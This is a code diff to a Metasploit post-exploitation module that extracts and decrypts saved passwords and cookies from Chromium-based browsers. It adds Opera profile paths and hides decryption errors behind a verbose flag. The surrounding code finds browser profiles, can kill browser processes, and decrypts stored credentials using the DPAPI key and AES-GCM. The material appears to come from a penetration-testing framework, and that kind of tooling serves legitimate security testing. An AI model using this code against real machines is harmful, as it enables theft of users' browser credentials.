@@ -146,10 +146,18 @@ class MetasploitModule < Msf::Post
     }
 
     chromium_browsers.each do |path, name|
-      profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
+      if name == 'Opera'
+        profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Default"
+        local_state = "#{base_path}\\AppData\\Roaming\\#{path}\\Local State"
+      else
+        profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
+        browser_version_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version"
+        local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
+      end
+
       next unless directory?(profile_path)
 
-      browser_version = get_chromium_version("#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version")
+      browser_version = get_chromium_version(browser_version_path)
       print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
 
       kill_browser_process(name) if datastore['KILL_BROWSER']
@@ -158,7 +166,6 @@ class MetasploitModule < Msf::Post
         process_chromium_cache(profile_path, name)
       end
 
-      local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
       encryption_key = get_chromium_encryption_key(local_state)
       extract_chromium_data(profile_path, encryption_key, name)
     end
@@ -307,7 +314,7 @@ class MetasploitModule < Msf::Post
       print_good('Decryption successful.') if datastore['VERBOSE']
       return decrypted_data.strip
     rescue StandardError => e
-      print_error("Error during DPAPI decryption: #{e.message}")
+      print_error("Error during DPAPI decryption: #{e.message}") if datastore['VERBOSE']
       return nil
     end
   end
@@ -370,14 +377,14 @@ class MetasploitModule < Msf::Post
     # https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
     if encrypted_password[0, 3] == 'v20'
       unless @app_bound_encryption_detected
-        print_status('Detected entries using App-Bound encryption (v20). These entries will not be decrypted.')
+        print_status('Detected entries using App-Bound encryption (v20). These entries will not be decrypted.') if datastore['VERBOSE']
         @app_bound_encryption_detected = true
       end
       return nil
     end
 
     if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE + 3)
-      print_error('Invalid encrypted password length.')
+      print_error('Invalid encrypted password length.') if datastore['VERBOSE']
       return nil
     end
 
@@ -386,7 +393,7 @@ class MetasploitModule < Msf::Post
     tag = encrypted_password[-TAG_SIZE..]
 
     if iv.nil? || iv.length != IV_SIZE
-      print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
+      print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes") if datastore['VERBOSE']
       return nil
     end
 
@@ -400,7 +407,7 @@ class MetasploitModule < Msf::Post
       return decrypted_password
     rescue OpenSSL::Cipher::CipherError
       unless @password_decryption_failed
-        print_status('Password decryption failed for one or more entries. These entries could not be decrypted.')
+        print_status('Password decryption failed for one or more entries. These entries could not be decrypted.') if datastore['VERBOSE']
         @password_decryption_failed = true
       end
       return nil
